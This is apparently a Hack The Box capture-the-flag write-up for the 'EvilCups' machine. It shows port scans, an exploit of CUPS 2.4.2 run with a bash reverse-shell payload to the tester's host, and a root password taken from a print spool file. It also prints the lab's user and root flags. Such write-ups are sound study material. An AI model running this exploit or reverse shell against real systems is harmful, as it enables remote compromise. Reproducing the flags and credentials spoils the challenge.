![[Pasted image 20250212205825.png]]
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.230.39   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 19:08 CET
Nmap scan report for 10.129.230.39
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
631/tcp open  ipp

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds

```

### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,631 -sCV 10.129.230.39 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 19:09 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating Ping Scan at 19:09
Scanning 10.129.230.39 [4 ports]
Completed Ping Scan at 19:09, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:09
Completed Parallel DNS resolution of 1 host. at 19:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:09
Scanning 10.129.230.39 [2 ports]
Discovered open port 22/tcp on 10.129.230.39
Discovered open port 631/tcp on 10.129.230.39
Completed SYN Stealth Scan at 19:09, 0.05s elapsed (2 total ports)
Initiating Service scan at 19:09
Scanning 2 services on 10.129.230.39
Completed Service scan at 19:09, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.230.39.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:09
NSE Timing: About 99.30% done; ETC: 19:09 (0:00:00 remaining)
NSE Timing: About 99.65% done; ETC: 19:10 (0:00:00 remaining)
Completed NSE at 19:10, 64.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 8.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Nmap scan report for 10.129.230.39
Host is up, received echo-reply ttl 63 (0.018s latency).
Scanned at 2025-02-12 19:09:09 CET for 79s

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLhyWEKe+YMaLWwGVFwyHt8c6bWzFkIrhtFZYPkBfui0+1IrwnUmA3TZq1yQ9vN7Jn+Id6YxfaXO7CfraX69S/Y=
|   256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICsRxZMgAIyL7cg9PIv83wIGkMGjzbkzS1jktKqQ6Kij
631/tcp open  ipp     syn-ack ttl 63 CUPS 2.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 2.4.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.07 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

Here above we can see that there is a port that UDP and TCP is. This port is port 631 and has the service ipp. there is also a disallowed entry that has the file robots.txt. I am goiing to check on my webbrowser what i can find inside that file. 
![[Pasted image 20250212191837.png]]
As you can see above isnt there something to see on that file. I will try to go to the webpage of evilCups his self. There i am comming on a webpage of OpenPrinting using Cups version 2.4.2.

![[Pasted image 20250212192206.png]]

So now that i know that the website is running on Cups with version 2.4.2 will try to find a exploit for that version. After searching on the web for a exploit, there i found the following exploit https://github.com/IppSec/evil-cups/tree/main which i will use to exploit the server. By starting a listener on the first terminal and executing the following command on the second terminal.

```
python3 evilcups.py 10.10.14.143 10.129.230.39 'bash -c "bash -i >& /dev/tcp/10.10.14.143/4444 0>&1"' 
IPP Server Listening on ('10.10.14.143', 12345)
Sending udp packet to 10.129.230.39:631...
Please wait this normally takes 30 seconds...
60 elapsed
target connected, sending payload ...

target connected, sending payload ...
337 elapsed
target connected, sending payload ...
```
If i now go checking by the printers i will see that there is added a printer just like the picture below. 
![[Pasted image 20250212195455.png]]
If i now send a test page will i get connected to the ssh server.

![[Pasted image 20250212195514.png]]

As you can see am i now connected to the ssh server 
![[Pasted image 20250212195529.png]]
If i now go to the home folder then i will have there the user flag
`user flag = 37cdf19a93e421f58ea8a36b71175400`

```
lp@evilcups:/$ cd home
cd home
lp@evilcups:/home$ ls
ls
htb
lp@evilcups:/home$ cd htb
cd htb/
lp@evilcups:/home/htb$ ls
ls
user.txt
lp@evilcups:/home/htb$ cat user.txt
cat user.txt
37cdf19a93e421f58ea8a36b71175400
lp@evilcups:/home/htb$ 
```
by finding the `d00001-001` in the "var/spool/cups folder" did i find the password from the root user. if i know do the ssh command then i will get logged in with the following credentials.

![[Pasted image 20250212205314.png]]

| Username | Password                  |
| -------- | ------------------------- |
| root     | Br3@k-G!@ss-r00t-evilcups |

```
ssh root@10.129.65.85
The authenticity of host '10.129.65.85 (10.129.65.85)' can't be established.
ED25519 key fingerprint is SHA256:6gysjB7kwkdY5BxynZYNSYA7x0FAfLdR6Q6Qh4Krubc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.65.85' (ED25519) to the list of known hosts.
root@10.129.65.85's password: Br3@k-G!@ss-r00t-evilcups
Linux evilcups 6.1.0-25-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  1 14:29:03 2024 from 10.10.14.8
root@evilcups:~# 

```
Now that im logged in as user root can i go grab the root flag
`root flag = c4a16e2f8f0b63fda9f4b62a79a2b50f`

```
root@evilcups:~# ls
root.txt
root@evilcups:~# cat root.txt 
c4a16e2f8f0b63fda9f4b62a79a2b50f
root@evilcups:~#
```

ROOTED

![[Pasted image 20250212205628.png]]